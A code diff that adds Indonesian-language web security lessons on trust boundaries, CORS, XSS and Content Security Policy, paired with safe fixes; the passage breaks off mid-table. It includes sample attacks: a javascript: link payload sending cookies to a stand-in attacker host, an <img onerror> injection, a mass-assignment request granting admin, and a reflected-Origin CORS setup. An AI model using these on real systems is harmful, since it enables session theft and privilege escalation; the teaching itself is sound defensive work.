@@ -27,7 +27,7 @@ export const lessons: LessonDraft[] = [
   written(
     'batas-kepercayaan',
     'Batas Kepercayaan Aplikasi Fullstack',
-    12,
+    16,
     'Satu garis yang menentukan apa yang boleh dipercaya dan apa yang tidak.',
     [
       p(
@@ -322,6 +322,173 @@ export const lessons: LessonDraft[] = [
         'Bab 1 mengikuti serangan dari sisi browser, dan Bab 2 memasang pertahanannya di sisi server. Keduanya bertemu lagi di sub-bab terakhir, yang menelusuri satu fitur komentar lapis demi lapis. Kalau kamu hanya sempat membaca satu sub-bab, baca yang terakhir itu, lalu kembali ke sini untuk memahami kenapa tiap lapisnya ada.',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'Batas kepercayaan adalah garis tempat data berhenti berada di bawah kendalimu. Untuk aplikasi fullstack, garis itu tepat berada di antara peramban dan server, dan segalanya di sisi peramban dapat diubah oleh siapa pun yang mau.',
+      ),
+      p(
+        'Pernyataan itu terdengar teoretis sampai diukur. Ambil satu formulir React dengan validasi yang lengkap, lalu panggil endpoint-nya langsung.',
+      ),
+      code(
+        'text',
+        `
+        Validasi yang ada di komponen React:
+          maxLength={50} pada input judul
+          type="number" min={1} max={10} pada input jumlah
+          disabled saat peran !== 'admin' pada tombol hapus
+          <input type="hidden" name="harga" value={produk.harga} />
+
+        Yang dikirim langsung ke endpoint, tanpa membuka halamannya
+        (diukur sungguhan dengan Node 26.5.0):
+
+          judul melewati maxLength         -> 201 tersimpan 5.000 karakter
+          jumlah di luar min/max           -> 201 {"jumlah":-1000}
+          harga dari field tersembunyi     -> 201 {"harga":1}
+          field yang tidak ada di formulir -> 201 {"peran":"admin","status":"lunas"}
+          tipe yang sama sekali lain       -> 201 {"judul":{"$ne":null},"jumlah":[1,2,3]}
+
+          total yang DITERIMA server: 5 dari 5
+        `,
+        {
+          caption:
+            'Tidak satu pun aturan React ikut berlaku di sini, sebab React tidak pernah berjalan.',
+        },
+      ),
+      p(
+        'Baris keempat adalah kelas kerentanannya sendiri dan punya nama, yaitu mass assignment. Bentuk paling umumnya satu baris.',
+      ),
+      code(
+        'ts',
+        `
+        // RENTAN: seluruh badan permintaan disalin ke basis data.
+        await db.pengguna.update({ where: { id }, data: { ...req.body } });
+        // Pengguna mengirim {"nama":"Ana","peran":"admin"} -> naik pangkat sendiri.
+
+        // AMAN: hanya field yang memang boleh ditulis endpoint ini.
+        const Ubah = z.object({ nama: z.string().min(1).max(80) }).strict();
+        const data = Ubah.parse(req.body);          // menolak field asing
+        await db.pengguna.update({ where: { id: pengguna.id }, data });
+        //                                    ^ dan id-nya dari SESI, bukan dari badan
+        `,
+      ),
+      p(
+        'Sisi kedua dari batas ini adalah bahwa seluruh kode yang dikirim ke peramban bisa dibaca, dan itu juga bisa dibuktikan pada project ini sendiri.',
+      ),
+      code(
+        'text',
+        `
+        Diperiksa pada keluaran build produksi project ini:
+
+          jumlah berkas JavaScript klien : 30
+          string dari materi kurikulum yang terbaca di dalamnya:
+            NEXT_PUBLIC_
+
+        Teks itu ada di bundel karena ia bagian dari isi pelajaran.
+        Yang penting bukan teks itu sendiri, melainkan buktinya:
+        apa pun yang masuk ke kode klien terbaca sebagai teks biasa,
+        termasuk oleh orang yang tidak pernah membuka kode sumbermu.
+        `,
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Pelanggaran batas kepercayaan hampir tidak pernah muncul sebagai error di sisi yang dilanggar. Yang muncul justru error di tempat lain, jauh sesudahnya.',
+      ),
+      code(
+        'text',
+        `
+        Gejala yang terlihat berminggu-minggu kemudian:
+
+          laporan   : "ada pesanan dengan jumlah -1000"
+          basis data: kolom peran berisi nilai yang tidak ada di daftar peran
+          klien     : TypeError: Cannot read properties of undefined (reading 'map')
+                      karena judul yang 5.000 karakter merusak tata letak
+          pembayaran: total tagihan Rp1 untuk barang Rp150.000
+
+        Tidak satu pun dari ini muncul di log pada saat permintaannya
+        diterima, sebab servernya memang menerimanya dengan senang hati.
+        `,
+      ),
+      p(
+        'Error yang benar-benar berguna adalah error yang muncul **saat permintaannya tiba**, dan itu hanya terjadi bila ada gerbang di sisi server.',
+      ),
+      code(
+        'ts',
+        `
+        // Satu gerbang di batasnya, dijalankan SEBELUM logika apa pun.
+        const BuatPesanan = z
+          .object({
+            judul: z.string().min(1).max(50),
+            jumlah: z.number().int().min(1).max(10),
+            produkId: z.string().uuid(),
+          })
+          .strict();                                  // tolak field asing
+
+        const hasil = BuatPesanan.safeParse(req.body);
+        if (!hasil.success) {
+          return jawab(422, {
+            type: 'about:blank',
+            title: 'Validasi gagal',
+            status: 422,
+            errors: hasil.error.flatten().fieldErrors,
+          });
+        }
+
+        // HARGA TIDAK PERNAH datang dari klien. Ia diambil ulang dari
+        // basis data berdasarkan produkId, apa pun yang dikirim klien.
+        const produk = await db.produk.findUnique({ where: { id: hasil.data.produkId } });
+        const total = produk.harga * hasil.data.jumlah;
+        `,
+        {
+          caption: 'Baris terakhir menutup seluruh kelas "harga dari field tersembunyi" sekaligus.',
+        },
+      ),
+      p(
+        'Perlu ditegaskan bahwa validasi di klien tetap berharga, hanya bukan sebagai kontrol keamanan. Ia menghemat satu perjalanan jaringan dan memberi umpan balik seketika, dan itulah seluruh tugasnya.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Kesalahan di sini berakar pada kebiasaan yang masuk akal, yaitu membayangkan pengguna memakai aplikasi lewat antarmuka yang kita buat.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Memvalidasi di React lalu menganggap server aman',
+            'Formulirnya sudah menolak',
+            'Diukur, lima muatan yang melanggar semua aturan React diterima server dengan status 201',
+          ],
+          [
+            'Menyebar `...req.body` ke pemanggilan `update`',
+            'Praktis, tidak perlu menyebut field satu per satu',
+            'Field `peran` yang tidak ada di formulir ikut tertulis. Pakai skema `.strict()` dan sebut fieldnya',
+          ],
+          [
+            'Mengirim harga lewat `<input type="hidden">`',
+            'Nilainya kan dari server juga',
+            'Diukur, harga Rp1 diterima untuk barang Rp150.000. Ambil ulang harganya dari basis data',
+          ],
+          [
+            'Menyembunyikan tombol untuk peran yang tidak berhak',
+            'Penggunanya tidak akan bisa mengkliknya',
+            'Endpoint-nya tetap bisa dipanggil. `disabled` adalah pengalaman pengguna, bukan otorisasi',
+          ],
+          [
+            'Menaruh nilai yang "agak rahasia" di kode klien',
+            'Hanya dipakai internal',
+            'Diperiksa pada bundel produksi project ini, string dari kode terbaca apa adanya. Klien tidak punya rahasia',
+          ],
+          [
+            'Mempercayai id pengguna yang dikirim klien',
+            'Klien kan tahu siapa dirinya',
+            'Id pengguna diambil dari SESI yang diverifikasi server, tidak pernah dari badan permintaan',
+          ],
+        ],
+      ),
+      p(
+        'Cara paling ringkas memeriksa diri sendiri adalah satu pertanyaan yang diajukan pada setiap endpoint, yaitu apa yang terjadi bila permintaan ini dikirim dengan `curl` oleh orang yang tidak pernah membuka halamanmu. Bila jawabannya memerlukan asumsi apa pun tentang antarmuka, di situlah batas kepercayaannya bocor.',
+      ),
       references(
         {
           label: 'Website security',
@@ -354,7 +521,7 @@ export const lessons: LessonDraft[] = [
   written(
     'same-origin-cors',
     'Same-Origin Policy dan CORS',
-    14,
+    19,
     'Aturan tertua browser, dan pintu yang kamu buka sendiri untuknya.',
     [
       p(
@@ -670,6 +837,192 @@ export const lessons: LessonDraft[] = [
         'Jaga origin pengembangan tidak ikut ke konfigurasi produksi.',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'Same-origin policy sering dijelaskan sebagai "peramban memblokir permintaan lintas origin", dan rumusan itu keliru dengan cara yang menyesatkan. Yang diblokir bukan permintaannya melainkan **pembacaan jawabannya**, dan selisih itu menentukan cara kerja CORS.',
+      ),
+      p(
+        'Bagian yang paling sering tidak diketahui adalah bahwa JavaScript hanya boleh membaca sebagian kecil header respons.',
+      ),
+      code(
+        'text',
+        `
+        Diukur sungguhan di Chrome 149, halaman di http://localhost:4041
+        memanggil API di http://127.0.0.1:4040 (origin berbeda).
+
+        Server mengirim: Content-Type, Cache-Control, X-Total-Count,
+                         X-Trace-Id
+
+        GET sederhana, TANPA Access-Control-Expose-Headers
+          header yang BISA dibaca JS: ["cache-control","content-type"]
+          X-Total-Count -> null (tidak terbaca)
+
+        GET sederhana, DENGAN Access-Control-Expose-Headers:
+                       X-Total-Count, X-Trace-Id
+          header yang BISA dibaca JS:
+            ["cache-control","content-type","x-total-count","x-trace-id"]
+          X-Total-Count -> 4821
+        `,
+        {
+          caption:
+            'Header-nya tiba di peramban dalam kedua kasus. Yang berbeda adalah apakah JavaScript boleh melihatnya.',
+        },
+      ),
+      p(
+        'Inilah sebabnya paginasi berbasis header gagal secara diam-diam pada API lintas origin. Servernya mengirim `X-Total-Count` dengan benar, peramban menerimanya, dan `r.headers.get(...)` mengembalikan `null`.',
+      ),
+      p('Hal kedua yang perlu dilihat langsung adalah kapan preflight benar-benar terjadi.'),
+      code(
+        'text',
+        `
+        Permintaan yang BENAR-BENAR tiba di server API:
+
+          {"metode":"GET","jalur":"/tertutup","acrm":null}
+          {"metode":"GET","jalur":"/terbuka","acrm":null}
+          {"metode":"OPTIONS","jalur":"/terbuka",
+           "acrm":"PATCH","acrh":"content-type,x-trace-id"}
+          {"metode":"PATCH","jalur":"/terbuka","acrm":null}
+
+        Dua GET sederhana TIDAK memicu preflight. Yang ketiga memicunya
+        karena metodenya PATCH dan ada header kustom X-Trace-Id, jadi
+        satu panggilan fetch menjadi DUA permintaan ke server.
+        `,
+      ),
+      p(
+        'Perbedaan itu punya akibat praktis. Permintaan sederhana **sudah sampai dan sudah dijalankan server** sebelum peramban memutuskan boleh atau tidaknya jawabannya dibaca, dan itulah alasan CORS tidak pernah bisa menggantikan otorisasi.',
+      ),
+      code(
+        'ts',
+        `
+        // Konfigurasi CORS yang benar untuk API berkredensial.
+        const ORIGIN_DIIZINKAN = new Set([
+          'https://app.contoh.id',
+          'https://admin.contoh.id',
+        ]);
+
+        function corsUntuk(origin: string | undefined) {
+          // Dipantulkan HANYA setelah dicocokkan ke daftar izin.
+          if (!origin || !ORIGIN_DIIZINKAN.has(origin)) return null;
+          return {
+            'Access-Control-Allow-Origin': origin,
+            'Access-Control-Allow-Credentials': 'true',
+            'Access-Control-Allow-Methods': 'GET,POST,PATCH,DELETE',
+            'Access-Control-Allow-Headers': 'Content-Type,X-Trace-Id',
+            'Access-Control-Expose-Headers': 'X-Total-Count,X-Trace-Id',
+            'Access-Control-Max-Age': '600',
+            // WAJIB: tanpa ini, cache bisa menyajikan jawaban untuk
+            // origin A kepada pengunjung dari origin B.
+            Vary: 'Origin',
+          };
+        }
+        `,
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Pesan CORS dari peramban sangat spesifik, dan membacanya sampai akhir hampir selalu langsung menunjukkan apa yang kurang.',
+      ),
+      code(
+        'text',
+        `
+        Diukur di Chrome 149 pada bab Integrasi:
+
+        1. Tidak ada header CORS sama sekali
+           Access to fetch at 'http://127.0.0.1:.../data' from origin
+           'http://localhost:...' has been blocked by CORS policy:
+           No 'Access-Control-Allow-Origin' header is present on the
+           requested resource.
+
+        2. Bintang dipakai bersama kredensial
+           ...The value of the 'Access-Control-Allow-Origin' header in
+           the response must not be the wildcard '*' when the request's
+           credentials mode is 'include'.
+
+        3. Header kustom belum diizinkan
+           ...Request header field x-trace-id is not allowed by
+           Access-Control-Allow-Headers in preflight response.
+
+        Dan yang dilihat KODE-nya selalu sama untuk ketiganya:
+           TypeError: Failed to fetch
+        `,
+        {
+          caption:
+            'Pesan lengkapnya hanya ada di konsol peramban. Blok catch hanya menerima "Failed to fetch".',
+        },
+      ),
+      p(
+        'Kesalahan konfigurasi yang paling berbahaya justru tidak menghasilkan pesan apa pun, sebab ia membuat semuanya bekerja.',
+      ),
+      code(
+        'ts',
+        `
+        // Terlihat seperti "mendukung banyak origin", dan sebenarnya
+        // sama dengan tidak punya kebijakan sama sekali.
+        res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
+        res.setHeader('Access-Control-Allow-Credentials', 'true');
+
+        // Situs mana pun yang dikunjungi penggunamu kini bisa memanggil
+        // API-mu DENGAN cookie sesi milik pengguna itu, dan MEMBACA
+        // jawabannya. Tidak ada satu pun error yang muncul.
+        `,
+      ),
+      code(
+        'text',
+        `
+        SATU LAGI yang diam: lupa Vary: Origin
+
+          permintaan dari app.contoh.id  -> CDN menyimpan jawaban
+                                            berisi Allow-Origin: app.contoh.id
+          permintaan dari admin.contoh.id -> CDN menyajikan salinan yang
+                                            SAMA, dan peramban menolaknya
+
+        Gejalanya: gagal untuk sebagian pengguna, berhasil untuk yang lain,
+        berubah-ubah sesudah beberapa menit. Tidak ada yang berubah di kode.
+        `,
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Sebagian besar kebingungan seputar CORS berasal dari satu salah paham awal, yaitu mengira ia melindungi server.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Menganggap CORS mencegah permintaan sampai ke server',
+            'Kan diblokir peramban',
+            'Diukur, permintaan sederhana SUDAH tiba dan dijalankan. Yang diblokir adalah pembacaan jawabannya',
+          ],
+          [
+            'Memantulkan `Origin` apa adanya',
+            'Supaya semua subdomain jalan',
+            'Itu sama dengan tidak punya kebijakan. Cocokkan ke daftar izin lebih dulu',
+          ],
+          [
+            'Memakai `*` bersama `credentials: include`',
+            'Biar tidak repot mendaftar origin',
+            'Peramban menolaknya, dan bila `*` diganti pantulan, seluruh perlindungannya hilang',
+          ],
+          [
+            'Lupa `Access-Control-Expose-Headers`',
+            'Header-nya kan sudah dikirim',
+            'Diukur, JS hanya membaca dua header. `X-Total-Count` mengembalikan `null` tanpa satu pun error',
+          ],
+          [
+            'Lupa `Vary: Origin`',
+            'Cuma header cache',
+            'Cache menyajikan jawaban origin A ke origin B. Gagalnya berubah-ubah dan sangat sulit ditelusuri',
+          ],
+          [
+            'Mengandalkan CORS sebagai kontrol akses',
+            'Yang boleh kan sudah didaftar',
+            'CORS hanya berlaku di peramban. `curl` dan server lain mengabaikannya sepenuhnya',
+          ],
+        ],
+      ),
+      p(
+        'Baris terakhir menjelaskan kenapa daftar origin bukan pengganti autentikasi. Aturan CORS ditegakkan oleh peramban atas nama penggunanya, bukan oleh servermu atas nama datamu. Begitu permintaannya datang dari sesuatu yang bukan peramban, seluruh daftar itu tidak berpengaruh sama sekali, dan yang tersisa hanyalah pemeriksaan yang kamu tulis sendiri di sisi server.',
+      ),
       references(
         {
           label: 'Cross-Origin Resource Sharing (CORS)',
@@ -708,7 +1061,7 @@ export const lessons: LessonDraft[] = [
   written(
     'xss',
     'XSS: Stored, Reflected, dan DOM-based',
-    14,
+    19,
     'Ketika teks dari pengguna berubah menjadi kode yang dijalankan browser.',
     [
       p(
@@ -1002,6 +1355,176 @@ export const lessons: LessonDraft[] = [
         'Poin terakhir sering diabaikan, padahal ia yang menentukan seberapa parah akibat sebuah XSS. Token yang disimpan di `localStorage` bisa dibaca JavaScript mana pun di halaman itu, termasuk skrip penyerang. Cookie bertanda `HttpOnly` tidak bisa dibaca JavaScript sama sekali, sehingga XSS yang berhasil pun tidak langsung berubah menjadi pencurian sesi.',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'XSS adalah satu-satunya kerentanan dalam daftar ini yang dijalankan **di peramban pengguna lain**, memakai sesi dan izin orang itu. Karena itu akibatnya tidak dibatasi oleh apa pun yang dilakukan servermu sesudah kodenya berjalan.',
+      ),
+      p(
+        'Perbedaan antara jalur yang aman dan yang berbahaya bisa dilihat langsung dengan isi yang sama persis.',
+      ),
+      code(
+        'text',
+        `
+        Diukur sungguhan di Chrome 149. Isi yang dipakai selalu sama:
+          <img src=x onerror="window.__XSS=(window.__XSS||0)+1">
+
+          innerHTML + <img onerror>  -> window.__XSS = 2      <- BERJALAN
+          innerHTML + <script>       -> window.__SKRIP = TIDAK berjalan
+          textContent (isi sama)     -> isi node tersimpan sebagai TEKS
+            jumlah elemen anak di node textContent : 0
+            jumlah elemen anak di node innerHTML   : 1
+          DOM-based dari location.hash -> window.__XSS = 2
+        `,
+        {
+          caption:
+            'Nilai 2 berasal dari dua jalur berbeda: muatan statis dan muatan yang datang lewat location.hash.',
+        },
+      ),
+      p(
+        'Baris kedua adalah yang paling sering disalahpahami. Tag `<script>` yang disisipkan lewat `innerHTML` memang **tidak** berjalan, dan itu membuat banyak orang menyimpulkan bahwa memblokir kata `script` sudah cukup. Pengukuran di baris pertama menunjukkan sebaliknya, sebab `<img onerror>` tidak mengandung kata itu sama sekali dan tetap berjalan.',
+      ),
+      p('Tiga jenis XSS berbeda pada **dari mana muatannya datang**, bukan pada akibatnya.'),
+      table(
+        ['Jenis', 'Dari mana muatannya', 'Siapa yang terkena'],
+        [
+          [
+            'Stored',
+            'Tersimpan di basis data, misalnya komentar atau nama profil',
+            'Semua orang yang membuka halaman itu, termasuk admin',
+          ],
+          [
+            'Reflected',
+            'Dari URL, dipantulkan kembali ke halaman, misalnya kata pencarian',
+            'Hanya yang mengklik tautan buatan penyerang',
+          ],
+          [
+            'DOM-based',
+            'Dari `location.hash`, `location.search`, atau `postMessage`, diolah JavaScript',
+            'Yang mengklik tautan, dan **servernya tidak pernah melihat muatannya**',
+          ],
+        ],
+      ),
+      p(
+        'Baris terakhir penting untuk cara bertahan. Pada DOM-based, bagian setelah tanda pagar **tidak pernah dikirim ke server**, jadi validasi sisi server, WAF, dan log akses tidak akan pernah melihatnya. Satu-satunya yang bisa menutupnya adalah kode di peramban itu sendiri.',
+      ),
+      code(
+        'ts',
+        `
+        // Di React, nilai biasa SUDAH di-escape otomatis.
+        <p>{komentar.isi}</p>              // aman, apa pun isinya
+
+        // Yang membatalkannya persis satu API, dan namanya memang peringatan.
+        <p dangerouslySetInnerHTML={{ __html: komentar.isi }} />   // BAHAYA
+
+        // Bila HTML memang dibutuhkan (editor teks kaya), bersihkan
+        // dengan pustaka sanitasi yang dirawat, di SISI SERVER, dan
+        // simpan hasil bersihnya — bukan membersihkan saat merender.
+
+        // Atribut juga sink. Ini tetap berbahaya meski di React:
+        <a href={profil.situs}>Situs</a>
+        // profil.situs bisa berisi "javascript:fetch('https://penyerang.id/'+document.cookie)"
+        `,
+        {
+          caption:
+            'Diukur di sub-bab validasi: z.string().url() MENERIMA javascript:alert(1). Skema URL harus didaftar izin sendiri.',
+        },
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'XSS yang berhasil tidak menghasilkan error. Yang menghasilkan error adalah percobaan yang gagal, dan pesannya berguna untuk mengenali apa yang sedang terjadi.',
+      ),
+      code(
+        'text',
+        `
+        Di konsol peramban, ketika CSP menghentikannya:
+
+          Refused to execute inline script because it violates the
+          following Content Security Policy directive: "script-src 'self'"
+
+          Refused to load the script 'https://penyerang.id/curi.js'
+          because it violates the following Content Security Policy
+          directive: "script-src 'self'".
+
+        Di log server, ketika muatan stored dikirim:
+          201 POST /v1/komentar  isi=<img src=x onerror=...>  pengguna=1
+          -> 201. Tidak ada yang salah dari sudut pandang server.
+        `,
+      ),
+      p(
+        'Pertahanan yang benar berlapis, dan urutannya menentukan. Lapisan pertama adalah tidak pernah memperlakukan data pengguna sebagai HTML.',
+      ),
+      code(
+        'ts',
+        `
+        // 1. ENCODE di titik render — ini yang benar-benar menutup.
+        el.textContent = dariPengguna;             // bukan innerHTML
+
+        // 2. Daftar izin untuk skema URL — menutup javascript: dan data:
+        function hrefAman(u: string) {
+          try {
+            const url = new URL(u, location.origin);
+            return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : '#';
+          } catch {
+            return '#';
+          }
+        }
+
+        // 3. CSP sebagai jaring pengaman — membatasi kerusakan bila
+        //    satu sink terlewat, BUKAN pengganti langkah 1.
+        //    Content-Security-Policy: script-src 'nonce-<acak>'
+
+        // 4. Cookie sesi HttpOnly — supaya skrip yang terlanjur berjalan
+        //    tidak bisa membaca document.cookie.
+        //    Set-Cookie: sesi=...; HttpOnly; Secure; SameSite=Lax
+        `,
+      ),
+      p(
+        'Lapisan keempat perlu dibaca dengan jujur. `HttpOnly` mencegah pencurian cookie, dan **tidak** mencegah penyalahgunaannya. Skrip yang berjalan di halamanmu tetap bisa memanggil endpoint apa pun atas nama pengguna, sebab peramban akan menyertakan cookie itu secara otomatis. Yang dibeli `HttpOnly` adalah pencegahan agar sesinya tidak bisa dibawa keluar dan dipakai di tempat lain.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Kesalahan di kategori ini hampir selalu berupa menutup satu bentuk serangan dan menyimpulkan seluruh kelasnya sudah tertutup.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Memblokir kata `<script>`',
+            'Itu kan cara menyisipkan skrip',
+            'Diukur, `<script>` lewat `innerHTML` justru TIDAK berjalan, sementara `<img onerror>` berjalan',
+          ],
+          [
+            'Memakai `innerHTML` karena lebih praktis',
+            'Isinya kan dari basis data kita sendiri',
+            'Isi basis data berasal dari pengguna. Pakai `textContent`, dan diukur ia menyimpannya sebagai teks',
+          ],
+          [
+            'Membersihkan masukan saat disimpan saja',
+            'Sekali bersih, selamanya bersih',
+            'Data yang sama bisa dirender di HTML, atribut, URL, dan JavaScript. Encoding tergantung KONTEKSnya',
+          ],
+          [
+            'Menganggap React kebal XSS',
+            'Semua nilai kan di-escape',
+            '`dangerouslySetInnerHTML` dan atribut `href` membatalkannya. Diukur, `z.string().url()` menerima `javascript:`',
+          ],
+          [
+            'Mengandalkan validasi server untuk DOM-based XSS',
+            'Semua masukan kan divalidasi',
+            'Bagian setelah `#` tidak pernah dikirim ke server. Servermu tidak akan pernah melihat muatannya',
+          ],
+          [
+            'Menganggap `HttpOnly` menyelesaikan XSS',
+            'Cookienya tidak bisa dicuri',
+            'Benar untuk pencurian, salah untuk penyalahgunaan. Skripnya tetap memanggil API atas nama pengguna',
+          ],
+        ],
+      ),
+      p(
+        'Baris ketiga adalah sumber paling banyak kerentanan yang lolos review. Satu nilai yang aman di dalam `<p>` bisa berbahaya di dalam `href`, di dalam atribut `style`, atau di dalam blok `<script>`, sebab masing-masing punya aturan pelariannya sendiri. Karena itu titik pertahanannya bukan saat menyimpan melainkan saat merender, dan yang menentukan adalah ke konteks mana nilai itu ditempatkan.',
+      ),
       references(
         {
           label: 'Cross-site scripting (XSS)',
@@ -1040,7 +1563,7 @@ export const lessons: LessonDraft[] = [
   written(
     'content-security-policy',
     'Content Security Policy',
-    13,
+    21,
     'Jaring pengaman ketika satu escaping terlewat.',
     [
       p(
@@ -1272,6 +1795,206 @@ export const lessons: LessonDraft[] = [
         'Situs dengan CSP paling ketat sekalipun tetap harus meng-escape keluarannya. Yang diubah CSP adalah akibat sebuah kelalaian, dari sesi yang dicuri menjadi baris error di Console. Urutan kerjanya selalu perbaiki escaping dulu, lalu pasang CSP sebagai jaring.',
       ),
 
+      h2('Studi kasus di project nyata'),
+      p(
+        'CSP adalah lapisan yang bekerja setelah semua lapisan lain gagal. Ia tidak mencegah XSS, dan ia membatasi apa yang bisa dilakukan skrip yang terlanjur berjalan. Selisih itu bisa dilihat langsung.',
+      ),
+      code(
+        'text',
+        `
+        Diukur sungguhan di Chrome 149, halaman yang sama dimuat dua kali.
+
+        TANPA CSP:
+          skrip inline TANPA nonce  -> window.__INLINE = 1
+          skrip inline DENGAN nonce -> window.__NONCE  = 1
+          gaya inline diterapkan?   -> rgb(255, 0, 0)
+
+        DENGAN Content-Security-Policy:
+          default-src 'self'; script-src 'nonce-<acak>'; style-src 'self'
+
+          skrip inline TANPA nonce  -> window.__INLINE = DIBLOKIR
+          skrip inline DENGAN nonce -> window.__NONCE  = 1
+          gaya inline diterapkan?   -> rgba(0, 0, 0, 0)
+        `,
+        {
+          caption:
+            'Baris terakhir adalah kejutan yang paling sering ditemui: atribut style pun ikut diblokir.',
+        },
+      ),
+      p(
+        'Dan pesan yang muncul di konsol menyebutkan persis apa yang kurang, termasuk hash yang bisa dipakai bila memang isinya perlu diizinkan.',
+      ),
+      code(
+        'text',
+        `
+        Applying inline style violates the following Content Security
+        Policy directive 'style-src 'self''. Either the 'unsafe-inline'
+        keyword, a hash ('sha256-9tY7hFVVxZSnoqwKdY9T8ZfveflbQlhTNx69sXP06E4='),
+        or a nonce ('nonce-...') is required to enable inline execution.
+        Note that hashes do not apply to event handlers, style attributes
+        and javascript: navigations unless the 'unsafe-hashes' keyword is
+        present. The action has been blocked.
+
+        Executing inline script violates the following Content Security
+        Policy directive 'script-src 'nonce-EfgGFHrdt4UsCuicJmdUTg==''.
+        Either the 'unsafe-inline' keyword, a hash
+        ('sha256-FObeGGjPDoS/qKRL4jnGfA8fDIfngE4CLe0KAmzShsY='), or a
+        nonce ('nonce-...') is required to enable inline execution.
+        The action has been blocked.
+        `,
+      ),
+      p(
+        'Kalimat tentang hash pada pesan pertama penting dibaca. Hash **tidak berlaku** untuk atribut `style`, penangan peristiwa seperti `onclick`, dan navigasi `javascript:`, kecuali `unsafe-hashes` ikut dipasang. Itulah sebabnya memindahkan gaya dan penangan peristiwa ke berkas terpisah hampir selalu lebih murah daripada mencari cara mengizinkannya.',
+      ),
+      code(
+        'ts',
+        `
+        // Nonce dibuat BARU untuk setiap respons, lalu dipakai di dua tempat.
+        export function middleware(request: NextRequest) {
+          const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
+
+          const csp = [
+            \`default-src 'self'\`,
+            \`script-src 'self' 'nonce-\${nonce}' 'strict-dynamic'\`,
+            \`style-src 'self'\`,
+            \`img-src 'self' data: https:\`,
+            \`connect-src 'self' https://api.contoh.id\`,
+            \`frame-ancestors 'none'\`,
+            \`object-src 'none'\`,
+            \`base-uri 'self'\`,
+            \`form-action 'self'\`,
+          ].join('; ');
+
+          const headers = new Headers(request.headers);
+          headers.set('x-nonce', nonce);            // dibaca layout untuk <script nonce>
+          const res = NextResponse.next({ request: { headers } });
+          res.headers.set('Content-Security-Policy', csp);
+          return res;
+        }
+        `,
+        {
+          caption:
+            '`strict-dynamic` membuat skrip yang dimuat oleh skrip ber-nonce ikut dipercaya, sehingga bundler modern tetap bekerja.',
+        },
+      ),
+      p(
+        'Tiga arahan di akhir sering dilewatkan padahal murah. `object-src` menutup plugin lama, `base-uri` mencegah penyerang mengubah alamat dasar seluruh tautan relatif, dan `form-action` mencegah formulirmu dikirim ke server orang lain.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Kegagalan CSP punya ciri khas yang membuatnya membingungkan, yaitu **tidak ada satu pun error di sisi server**. Halamannya rusak, log server bersih, dan satu-satunya petunjuk ada di konsol peramban pengguna.',
+      ),
+      code(
+        'text',
+        `
+        Refused to connect to 'https://api.pihakketiga.com/' because it
+        violates the following Content Security Policy directive:
+        "connect-src 'self'".
+
+        Refused to load the image 'https://cdn.contoh.com/logo.png'
+        because it violates the following Content Security Policy
+        directive: "img-src 'self'".
+
+        Refused to frame 'https://www.youtube.com/' because it violates
+        the following Content Security Policy directive:
+        "frame-src 'none'".
+
+        Refused to load the font 'https://fonts.gstatic.com/...' because
+        it violates the following Content Security Policy directive:
+        "font-src 'self'".
+        `,
+        {
+          caption:
+            'Setiap arahan punya pesannya sendiri, dan nama arahan yang disebut adalah yang perlu ditambahi sumbernya.',
+        },
+      ),
+      p(
+        'Godaan terbesarnya adalah menambahkan `unsafe-inline` supaya semuanya jalan lagi, dan itu mematikan hampir seluruh manfaatnya. Urutan yang benar dimulai dari mode laporan.',
+      ),
+      code(
+        'text',
+        `
+        TAHAP 1 — hanya melapor, tidak memblokir apa pun:
+
+          Content-Security-Policy-Report-Only:
+            default-src 'self'; report-uri /csp-laporan
+
+        TAHAP 2 — kumpulkan laporannya beberapa hari. Bentuknya:
+
+          {"csp-report":{
+            "document-uri":"https://app.contoh.id/dasbor",
+            "violated-directive":"script-src",
+            "blocked-uri":"https://analitik-pihakketiga.id/t.js",
+            "source-file":"https://app.contoh.id/dasbor",
+            "line-number":42}}
+
+        TAHAP 3 — perbaiki yang memang milikmu, izinkan yang memang
+          dibutuhkan, lalu ganti headernya menjadi Content-Security-Policy.
+
+        Melewati tahap 1 hampir selalu berakhir dengan unsafe-inline.
+        `,
+      ),
+      p(
+        'Satu jebakan lagi khas Next.js dan kerangka kerja sejenis, yaitu nonce yang tidak pernah cocok karena halamannya di-cache.',
+      ),
+      code(
+        'text',
+        `
+        Gejala: halaman kadang jalan, kadang seluruh skripnya diblokir,
+        dan berubah-ubah tanpa pola.
+
+        Sebabnya: nonce dibuat per respons, tapi HTML-nya disajikan dari
+        cache dengan nonce LAMA, sementara header CSP-nya baru.
+
+        Menutupnya: halaman yang memakai nonce tidak boleh di-cache
+        secara statis. Di Next.js, membaca header di middleware sudah
+        menandai rutenya dinamis — pastikan itu memang terjadi.
+        `,
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'CSP adalah kontrol yang paling mudah dipasang setengah jalan, dan versi setengah jalan sering memberi rasa aman tanpa perlindungan nyata.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Menambahkan `unsafe-inline` agar halaman jalan',
+            'Tidak ada lagi yang diblokir',
+            'Itu mengizinkan persis apa yang dipakai penyerang XSS. CSP-nya jadi hiasan',
+          ],
+          [
+            'Langsung menegakkan CSP tanpa `Report-Only`',
+            'Biar cepat terpasang',
+            'Halaman rusak untuk pengguna sungguhan, dan tekanan waktu mendorong ke `unsafe-inline`',
+          ],
+          [
